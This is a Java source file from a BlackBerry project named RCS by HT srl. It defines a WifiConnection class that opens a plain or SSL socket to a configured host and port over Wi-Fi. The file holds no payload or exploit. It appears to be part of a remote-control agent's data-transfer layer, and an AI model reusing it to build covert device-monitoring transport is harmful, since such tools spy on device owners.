//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.transfer
 * File         : WifiConnection.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.transfer;

import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;
import net.rim.device.api.system.WLANInfo.WLANAPInfo;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class WifiConnection.
 */
public final class WifiConnection extends Connection {
    //#ifdef DEBUG
    static Debug debug = new Debug("Wifi", DebugLevel.VERBOSE);
    //#endif

    private final String host;
    private final int port;
    private final boolean ssl;

    private final int timeout = 3 * 60 * 1000;

    boolean deviceside;

    // Constructor
    /**
     * Instantiates a new wifi connection.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param deviceside_
     *            the deviceside_
     */
    public WifiConnection(final String host_, final int port_,
            final boolean ssl_) {
        host = host_;
        port = port_;
        ssl = ssl_;
        deviceside = true;

        if (ssl) {
            url = "ssl://";
        } else {
            url = "socket://";
        }

        url += host + ":" + port + ";ConnectionTimeout=" + timeout
                + ";deviceside=true;interface=wifi";

        //#ifdef DEBUG_TRACE
        debug.trace(" url: " + url);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#error(java.lang.String)
     */
    protected void error(final String string) {
        //#ifdef DEBUG
        debug.error(string);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#isActive()
     */
    public synchronized boolean isActive() {
        final boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
        //final boolean connected = WLANInfo.getWLANState() == WLANInfo.WLAN_STATE_CONNECTED;
        
        //#ifdef DEBUG_TRACE
        //debug.trace("WIFI: Active: " + active + " Connected: " + connected);
        //#endif
        return active;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#trace(java.lang.String)
     */
    protected void trace(final String string) {
        //#ifdef DEBUG_TRACE
        debug.trace(string);
        //#endif
    }

}
